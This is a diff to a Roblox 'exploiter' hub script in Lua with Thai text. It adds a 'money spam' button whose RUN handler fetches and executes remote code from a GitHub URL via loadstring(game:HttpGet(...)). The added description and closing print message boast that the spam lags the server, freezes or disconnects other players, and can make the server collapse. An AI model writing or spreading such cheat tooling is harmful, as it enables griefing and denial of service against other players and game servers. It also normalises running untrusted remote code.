@@ -1,6 +1,6 @@
--- TOU HUB (Mixed) - Ultimate Exploiter GUI Size Changer Edition 💀🔥🖤
--- LocalScript - เพิ่มปุ่ม "ปรับขนาดตัว" ในช่อง Script เมืองไทย2 + Popup โหด 😇🩸
--- พลังแห่งการย่อขยายตัวฟรีถูกปลดปล่อยแล้ว exploiter!
+-- TOU HUB (Mixed) - Ultimate Exploiter GUI Money Spam Edition 💀🔥🖤
+-- LocalScript - เพิ่มปุ่ม "สแปมเงิน" ในช่อง Script เมืองไทย2 + Popup โหด 🤫🩸
+-- พลังแห่งเงินทองต้องห้ามถูกปลดปล่อยแล้ว exploiter!
 
 local Players = game:GetService("Players")
 local UIS = game:GetService("UserInputService")
@@ -253,10 +253,10 @@ darkAdminBtn.TextSize = 14
 darkAdminBtn.Parent = tabThai
 Instance.new("UICorner", darkAdminBtn).CornerRadius = UDim.new(0, 8)
 
--- ปุ่ม ปรับขนาดตัว (ใหม่! วางข้าง Dark admin ไล่ซ้าย)
+-- ปุ่ม ปรับขนาดตัว (ข้าง Dark admin)
 local sizeChangerBtn = Instance.new("TextButton")
 sizeChangerBtn.Size = UDim2.new(0, 80, 0, 30)
-sizeChangerBtn.Position = UDim2.new(1, -200, 0, 50)  -- ซ้าย Dark admin
+sizeChangerBtn.Position = UDim2.new(1, -200, 0, 50)
 sizeChangerBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
 sizeChangerBtn.Text = "ปรับขนาดตัว"
 sizeChangerBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
@@ -264,6 +264,18 @@ sizeChangerBtn.Font = Enum.Font.SourceSansBold
 sizeChangerBtn.TextSize = 14
 sizeChangerBtn.Parent = tabThai
 Instance.new("UICorner", sizeChangerBtn).CornerRadius = UDim.new(0, 8)
+
+-- ปุ่ม สแปมเงิน (ใหม่! วางข้าง ปรับขนาดตัว ไล่ซ้าย)
+local moneySpamBtn = Instance.new("TextButton")
+moneySpamBtn.Size = UDim2.new(0, 80, 0, 30)
+moneySpamBtn.Position = UDim2.new(1, -300, 0, 50)  -- ซ้าย ปรับขนาดตัว
+moneySpamBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
+moneySpamBtn.Text = "สแปมเงิน"
+moneySpamBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+moneySpamBtn.Font = Enum.Font.SourceSansBold
+moneySpamBtn.TextSize = 14
+moneySpamBtn.Parent = tabThai
+Instance.new("UICorner", moneySpamBtn).CornerRadius = UDim.new(0, 8)
 
 -- GUI Popup สำหรับ Dark admin (เดิม)
 local darkPopup = Instance.new("Frame")
@@ -382,7 +394,7 @@ darkAdminBtn.MouseButton1Click:Connect(function()
     darkPopup.Visible = true
 end)
 
--- GUI Popup สำหรับ ปรับขนาดตัว (ใหม่!)
+-- GUI Popup สำหรับ ปรับขนาดตัว
 local sizePopup = Instance.new("Frame")
 sizePopup.Size = UDim2.new(0, 400, 0, 250)
 sizePopup.Position = UDim2.new(0.5, -200, 0.5, -125)
@@ -497,6 +509,123 @@ end)
 -- เมื่อกดปุ่ม ปรับขนาดตัว → โชว์ Popup
 sizeChangerBtn.MouseButton1Click:Connect(function()
     sizePopup.Visible = true
+end)
+
+-- GUI Popup สำหรับ สแปมเงิน (ใหม่!)
+local moneySpamPopup = Instance.new("Frame")
+moneySpamPopup.Size = UDim2.new(0, 400, 0, 250)
+moneySpamPopup.Position = UDim2.new(0.5, -200, 0.5, -125)
+moneySpamPopup.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+moneySpamPopup.BorderSizePixel = 0
+moneySpamPopup.Visible = false
+moneySpamPopup.Parent = gui
+moneySpamPopup.ZIndex = 10
+
+local moneySpamPopupCorner = Instance.new("UICorner", moneySpamPopup)
+moneySpamPopupCorner.CornerRadius = UDim.new(0, 16)
+
+local moneySpamPopupShadow = Instance.new("ImageLabel")
+moneySpamPopupShadow.BackgroundTransparency = 1
+moneySpamPopupShadow.Image = "rbxassetid://1316045217"
+moneySpamPopupShadow.ImageTransparency = 0.4
+moneySpamPopupShadow.Size = UDim2.new(1, 40, 1, 40)
+moneySpamPopupShadow.Position = UDim2.new(0, -20, 0, -20)
+moneySpamPopupShadow.ZIndex = 9
+moneySpamPopupShadow.Parent = moneySpamPopup
+
+local moneySpamPopupTitle = Instance.new("TextLabel")
+moneySpamPopupTitle.Size = UDim2.new(1, 0, 0, 50)
+moneySpamPopupTitle.BackgroundTransparency = 1
+moneySpamPopupTitle.Text = "script:สแปมเงิน"
+moneySpamPopupTitle.TextColor3 = Color3.fromRGB(0, 255, 0)
+moneySpamPopupTitle.Font = Enum.Font.SourceSansBold
+moneySpamPopupTitle.TextSize = 26
+moneySpamPopupTitle.ZIndex = 11
+moneySpamPopupTitle.Parent = moneySpamPopup
+
+local moneySpamPopupDesc = Instance.new("TextLabel")
+moneySpamPopupDesc.Size = UDim2.new(1, -20, 0, 80)
+moneySpamPopupDesc.Position = UDim2.new(0, 10, 0, 60)
+moneySpamPopupDesc.BackgroundTransparency = 1
+moneySpamPopupDesc.Text = "คำอธิบาย: script. สแปมเงิน ยิ่งใส่จำนวนเยอะยิ่งแล็ค\nถ้าสแปมใส่คนเยอะๆ คนจะหลุดไม่ก็ค้าง🤫"
+moneySpamPopupDesc.TextColor3 = Color3.fromRGB(200, 200, 200)
+moneySpamPopupDesc.Font = Enum.Font.SourceSans
+moneySpamPopupDesc.TextSize = 18
+moneySpamPopupDesc.TextWrapped = true
+moneySpamPopupDesc.TextYAlignment = Enum.TextYAlignment.Top
+moneySpamPopupDesc.ZIndex = 11
+moneySpamPopupDesc.Parent = moneySpamPopup
+
+local moneySpamPopupCreator = Instance.new("TextLabel")
+moneySpamPopupCreator.Size = UDim2.new(1, -20, 0, 30)
+moneySpamPopupCreator.Position = UDim2.new(0, 10, 0, 140)
+moneySpamPopupCreator.BackgroundTransparency = 1
+moneySpamPopupCreator.Text = "ผู้สร้าง: TOUx1"
+moneySpamPopupCreator.TextColor3 = Color3.fromRGB(0, 255, 170)
+moneySpamPopupCreator.Font = Enum.Font.SourceSansBold
+moneySpamPopupCreator.TextSize = 20
+moneySpamPopupCreator.ZIndex = 11
+moneySpamPopupCreator.Parent = moneySpamPopup
+
+-- ปุ่ม RUN สำหรับ สแปมเงิน
+local runBtnMoney = Instance.new("TextButton")
+runBtnMoney.Size = UDim2.new(0, 150, 0, 50)
+runBtnMoney.Position = UDim2.new(0.5, -160, 1, -70)
+runBtnMoney.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
+runBtnMoney.Text = "RUN"
+runBtnMoney.TextColor3 = Color3.fromRGB(255, 255, 255)
+runBtnMoney.Font = Enum.Font.SourceSansBold
+runBtnMoney.TextSize = 28
+runBtnMoney.ZIndex = 11
+runBtnMoney.Parent = moneySpamPopup
+Instance.new("UICorner", runBtnMoney).CornerRadius = UDim.new(0, 12)
+
+local runGradientMoney = Instance.new("UIGradient")
+runGradientMoney.Color = ColorSequence.new{
+	ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 255, 0)),
+	ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 150, 0))
+}
+runGradientMoney.Parent = runBtnMoney
+
+runBtnMoney.MouseButton1Click:Connect(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/TOUx1/Roblox-script/refs/heads/main/Spam%20money"))()
+    moneySpamPopup.Visible = false
+end)
+
+-- ปุ่ม ยกเลิก สำหรับ สแปมเงิน
+local cancelBtnMoney = Instance.new("TextButton")
+cancelBtnMoney.Size = UDim2.new(0, 150, 0, 50)
+cancelBtnMoney.Position = UDim2.new(0.5, 10, 1, -70)
+cancelBtnMoney.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
+cancelBtnMoney.Text = "ยกเลิก"
+cancelBtnMoney.TextColor3 = Color3.fromRGB(255, 255, 255)
+cancelBtnMoney.Font = Enum.Font.SourceSansBold
+cancelBtnMoney.TextSize = 28
+cancelBtnMoney.ZIndex = 11
+cancelBtnMoney.Parent = moneySpamPopup
+Instance.new("UICorner", cancelBtnMoney).CornerRadius = UDim.new(0, 12)
+cancelBtnMoney.MouseButton1Click:Connect(function()
+    moneySpamPopup.Visible = false
+end)
+
+-- ปุ่มปิด X สำหรับ สแปมเงิน
+local closePopupMoney = Instance.new("TextButton")
+closePopupMoney.Size = UDim2.new(0, 30, 0, 30)
+closePopupMoney.Position = UDim2.new(1, -40, 0, 10)
+closePopupMoney.BackgroundTransparency = 1
+closePopupMoney.Text = "X"
+closePopupMoney.TextColor3 = Color3.fromRGB(255, 100, 100)
+closePopupMoney.Font = Enum.Font.SourceSansBold
+closePopupMoney.TextSize = 24
+closePopupMoney.ZIndex = 11
+closePopupMoney.Parent = moneySpamPopup
+closePopupMoney.MouseButton1Click:Connect(function()
+    moneySpamPopup.Visible = false
+end)
+
+-- เมื่อกดปุ่ม สแปมเงิน → โชว์ Popup
+moneySpamBtn.MouseButton1Click:Connect(function()
+    moneySpamPopup.Visible = true
 end)
 
 -- ช่อง Script ทั่วไป
@@ -614,4 +743,4 @@ UIS.InputChanged:Connect(function(input)
 	end
 end)
 
-print("TOU HUB (Mixed) เพิ่มปุ่มปรับขนาดตัวสำเร็จ 💀🖤 | ช่องเมืองไทย2 โหดยิ่งขึ้น 😇 | ลุยย่อขยายตัวฟรีได้เลย exploiter!")
+print("TOU HUB (Mixed) เพิ่มปุ่มสแปมเงินสำเร็จ 💀🖤 | ช่องเมืองไทย2 โหดยิ่งขึ้น 🤫💰 | ลุยสแปมให้เซิร์ฟเวอร์พังทลายได้เลย exploiter!")
